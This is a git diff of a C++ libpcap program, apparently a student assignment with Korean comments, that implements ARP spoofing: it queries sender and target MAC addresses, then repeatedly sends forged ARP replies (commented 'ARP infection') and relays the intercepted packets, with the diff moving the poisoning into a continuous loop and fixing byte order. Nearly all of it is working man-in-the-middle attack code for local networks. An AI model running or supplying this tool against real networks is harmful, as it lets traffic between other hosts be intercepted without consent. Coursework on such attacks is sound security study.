@@ -9,6 +9,7 @@
 #include <sys/socket.h>
 #include <iostream>
 #include <vector>
+#include <algorithm>
 #include <fstream>
 #include <map>
 using namespace std;
@@ -21,7 +22,6 @@ struct EthArpPacket final {
 
 vector<pair<string,string>> sender_target_ip_pair;
 map<string,string> ip_mac_pair;
-
 
 
 void usage() {
@@ -64,12 +64,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	char* dev = argv[1];
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
+
     string my_mac_addr;
     string my_ip_addr;
     //나의 mac주소 구하기  
@@ -77,6 +72,9 @@ int main(int argc, char* argv[]) {
 	string my_mac_filpath = "/sys/class/net/"+interface+"/address";
 	ifstream ifs(my_mac_filpath);
 	ifs>>my_mac_addr;
+	for(int i=0;i<my_mac_addr.size();i++){
+		my_mac_addr[i]=toupper(my_mac_addr[i]);
+	}
 	ifs.close();
 	//나의 ip주소 구하기 --> 이건 chatGPT 도움을 좀 받았습니다.
 	struct ifaddrs* ifAddrList = nullptr;
@@ -113,24 +111,30 @@ int main(int argc, char* argv[]) {
     freeifaddrs(ifAddrList);
 	my_ip_addr = ipAddress;
 	//ARP Request로 mac주소 질의 
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev, 1024, 1, 1000, errbuf);
+	if (handle == nullptr) {
+		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		return -1;
+	}
+
+
 	for(int i=0;i<sender_target_ip_pair.size();i++){
 		const string sender_ip = sender_target_ip_pair[i].first;
 		const string target_ip = sender_target_ip_pair[i].second;
 		//sender의 mac주소 질의
 		sendArpPacket("FF:FF:FF:FF:FF:FF",my_mac_addr,my_ip_addr,"00:00:00:00:00:00",sender_ip,handle,1);
-		
 		while(true){
 			const u_char* packet;
 			struct pcap_pkthdr* header;
 			int res = pcap_next_ex(handle, &header, &packet);
-			cout<<res<<endl;
 			struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
 			struct EthHdr ethhdr = etharphdr->eth_;
 			struct ArpHdr arphdr = etharphdr->arp_;
 			if(ntohs(ethhdr.type_)!=0x0806) continue;
-			Ip s_ip = arphdr.sip_;
+			Ip s_ip = ntohl(arphdr.sip_);
 			Mac s_mac = arphdr.smac_;
-			Ip t_ip = arphdr.tip_;
+			Ip t_ip = ntohl(arphdr.tip_);
 			Mac t_mac = arphdr.tmac_;
 			if(string(s_ip)==sender_ip && string(t_mac)==my_mac_addr){
 				ip_mac_pair[sender_ip]=string(s_mac);
@@ -152,9 +156,9 @@ int main(int argc, char* argv[]) {
 			struct EthHdr ethhdr = etharphdr->eth_;
 			struct ArpHdr arphdr = etharphdr->arp_;
 			if(ntohs(ethhdr.type_)!=0x0806) continue;
-			Ip s_ip = arphdr.sip_;
+			Ip s_ip = ntohl(arphdr.sip_);
 			Mac s_mac = arphdr.smac_;
-			Ip t_ip = arphdr.tip_;
+			Ip t_ip = ntohl(arphdr.tip_);
 			Mac target_mac = arphdr.tmac_;
 			if(string(s_ip)==target_ip && string(target_mac)==my_mac_addr){
 				ip_mac_pair[target_ip]=string(s_mac);
@@ -164,15 +168,16 @@ int main(int argc, char* argv[]) {
 		}
 	}
 
-	//ARP infection 
-	for(int i=0;i<sender_target_ip_pair.size();i++){
-		string sender_ip = sender_target_ip_pair[i].first;
-		string target_ip = sender_target_ip_pair[i].second;
-		string sender_mac = ip_mac_pair[sender_ip];
-		string target_mac = ip_mac_pair[target_ip];
-		sendArpPacket(sender_mac,target_mac,target_ip,sender_mac,sender_ip,handle,2);
-	}
+	cout<<"fd"<<endl;
 	while(true){
+		//ARP infection 
+		for(int i=0;i<sender_target_ip_pair.size();i++){
+			string sender_ip = sender_target_ip_pair[i].first;
+			string target_ip = sender_target_ip_pair[i].second;
+			string sender_mac = ip_mac_pair[sender_ip];
+			string target_mac = ip_mac_pair[target_ip];
+			sendArpPacket(sender_mac,target_mac,target_ip,sender_mac,sender_ip,handle,2);
+		}
 		//relay packets 
 		const u_char* packet;
 		struct pcap_pkthdr* header;
